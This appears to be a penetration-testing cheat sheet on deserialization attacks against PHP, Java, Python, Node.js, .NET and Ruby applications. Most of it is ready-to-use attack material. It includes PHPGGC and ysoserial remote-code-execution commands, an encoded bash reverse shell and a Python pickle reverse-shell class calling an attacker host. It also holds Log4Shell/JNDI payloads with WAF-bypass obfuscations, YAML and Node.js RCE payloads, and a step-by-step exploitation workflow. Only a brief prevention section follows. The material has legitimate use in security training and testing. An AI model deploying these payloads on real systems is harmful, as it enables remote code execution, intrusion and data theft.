# Deserialization Attacks — Complete Guide
## Last Updated: 2026-07-10

## Deserialization Fingerprints

| Language | Header (Hex) | Header (Base64) | Indicators |
|---|---|---|---|
| .NET ViewState | FF 01 | /w | Hidden inputs in HTML forms |
| BinaryFormatter | 0001 0000 00FF FFFF FF01 | AAEAAAD | Long FF FF FF FF sequence |
| Java Serialized | AC ED | rO | Base64 starts with rO |
| PHP Serialized | 4F 3A | Tz | Prefixes: O:, a:, s:, i:, b: |
| Python Pickle | 80 04 95 | gASV | Opcodes: (lp0, S'Test' |
| Ruby Marshal | 04 08 | BAgK | \x04\x08 at start |

## PHP Deserialization

### Magic Methods
```php
__sleep()      // Called when serializing
__wakeup()     // Called when deserializing
__unserialize() // Called instead of __wakeup (PHP 7+)
__destruct()   // Called when object destroyed
__toString()   // Called when object treated as string
```

### PHPGGC (ysoserial for PHP)
```bash
# List all gadget chains
phpggc -l

# RCE gadgets
phpggc Laravel/RCE1 system id
phpggc Laravel/RCE2 system id
phpggc Symfony/RCE1 system id
phpggc Symfony/RCE2 system id
phpggc Symfony/RCE3 system id
phpggc CodeIgniter/RCE1 system id
phpggc CodeIgniter/RCE2 system id
phpggc Drupal/RCE1 system id
phpggc Yii/RCE1 system id
phpggc Yii/RCE2 system id

# File read
phpggc Laravel/FD1 file_get_contents /etc/passwd

# SSRF
phpggc Laravel/SSRF1 curl http://attacker
```

### phar:// Deserialization
```bash
# If LFI reads file but doesn't execute PHP
# Use phar:// protocol to trigger deserialization
# Create malicious PHAR
php -d phar.readonly=0 create_phar.php
# Then include: ?file=phar://uploads/malicious.phar/test.txt
```

## Java Deserialization

### ysoserial
```bash
# Test if injection is possible (DNS)
java -jar ysoserial.jar URLDNS http://attacker.com

# RCE payloads
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections2 'id'
java -jar ysoserial.jar CommonsCollections3 'id'
java -jar ysoserial.jar CommonsCollections4 'id'
java -jar ysoserial.jar CommonsCollections5 'id'
java -jar ysoserial.jar CommonsCollections6 'id'
java -jar ysoserial.jar CommonsCollections7 'id'

# Windows RCE
java -jar ysoserial.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1'
java -jar ysoserial.jar CommonsCollections4 'cmd /c echo pwned > C:\pwned.txt'

# Linux RCE
java -jar ysoserial.jar CommonsCollections4 'ping -c 5 attacker.com'
java -jar ysoserial.jar CommonsCollections4 'touch /tmp/pwned'

# Reverse shell (Linux)
java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'

# Reverse shell (Windows)
java -jar ysoserial.jar CommonsCollections4 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc <BASE64_PAYLOAD>'
```

### marshalsec (JSON/YML)
```bash
# Compile
mvn clean package -DskipTests

# Generate payloads for different JSON/YML libraries
java -cp marshalsec.jar marshalsec.XStream <gadget> <command>
```

### JNDI Injection
```bash
# RMI
java -jar JNDIExploit.jar -i attacker.com

# LDAP
java -jar JNDIExploit.jar -i attacker.com -l 1389

# Payload
${jndi:rmi://attacker.com/Exploit}
${jndi:ldap://attacker.com/Exploit}
${jndi:dns://attacker.com} (blind)
```

### Log4Shell (CVE-2021-44228)
```bash
# Basic
${jndi:ldap://attacker.com/a}

# WAF bypass
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}
${${lower:j}ndi:ldap://attacker.com/a}
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://attacker.com/a}

# All headers to test
User-Agent, X-Forwarded-For, X-Api-Version, Cookie, Referer,
Connection, Content-Type, Accept, X-Remote-IP, X-Client-IP,
X-Originating-IP, X-Real-IP, True-Client-IP
```

## Python Deserialization

### Pickle
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

# Generate payload
payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)

# Reverse shell
class ReverseShell:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'",))
```

### PyYAML
```yaml
# YAML deserialization RCE
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]
!!python/object/new:subprocess.check_output [['id']]
```

### jsonpickle
```json
{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}
```

## Node.js Deserialization

### node-serialize
```javascript
// Serialized function with auto-execution
{"rce":"_$$ND_FUNC$$_require('child_process').exec('id')"}

// With IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

### funcster
```javascript
// Bypass built-in object restriction
{"__js_function":"this.constructor.constructor(\"require('child_process').exec('id')\")()"}
```

### serialize-javascript
```javascript
// If eval() is used for deserialization
"require('child_process').exec('id')"
```

## .NET Deserialization

### ysoserial.net
```bash
# List gadgets
ysoserial.exe -l

# Generate payload
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"
ysoserial.exe -g ViewState -f Json.Net -c "cmd /c id"

# ViewState with known keys
ysoserial.exe -g ViewState -c "cmd /c id" --validationkey="KEY" --validationalg="SHA1"
```

### ViewState Deserialization
```bash
# If MAC validation disabled (CVE-2024-28938)
# Modify __VIEWSTATE parameter with ysoserial.net payload

# If MAC enabled but key known
ysoserial.exe -g ViewState -c "cmd /c id" --validationkey="<KEY>" --validationalg="SHA1"
```

## Ruby Deserialization

### Universal RCE Gadget
```ruby
# Ruby Marshal deserialization
require 'base64'
payload = Base64.decode64("BAhJIgdpZAY6BkVU")
```

## Detection & Exploitation Workflow

### Step 1: Find Serialized Data
```
Look for:
- Cookies (PHPSESSID, JSESSIONID, ASP.NET_SessionId, remember-me)
- POST body (form data, JSON, XML)
- Hidden inputs (__VIEWSTATE, __EVENTVALIDATION)
- URL parameters (token, data, payload)
- HTTP headers (Authorization, X-Data)
```

### Step 2: Identify Type
```
Base64 decode and check first bytes:
- rO0 = Java
- Tz = PHP (O:)
- /wAA = .NET ViewState
- AAEAAAD = .NET BinaryFormatter
- gASV = Python Pickle
- BAgK = Ruby Marshal
```

### Step 3: Test for Vulnerability
```
PHP: Modify object properties, check if __wakeup/__destruct called
Java: Use ysoserial URLDNS for blind test
Python: Try pickle with os.system
.NET: Use ysoserial.net with sleep payload
```

### Step 4: Exploit
```
Use appropriate tool:
- PHP: PHPGGC
- Java: ysoserial + marshalsec
- Python: Custom pickle payload
- .NET: ysoserial.net
- Ruby: Universal gadget
- Node: node-serialize/funcster exploit
```

## Prevention
```
PHP: Use allowed_classes => false in unserialize()
Java: Use ObjectInputFilter, avoid ObjectInputStream
Python: Don't use pickle for untrusted data, use JSON
.NET: Use DataContractSerializer instead of BinaryFormatter
Node: Don't use node-serialize, use JSON.parse
Ruby: Don't use Marshal.load for untrusted data
```
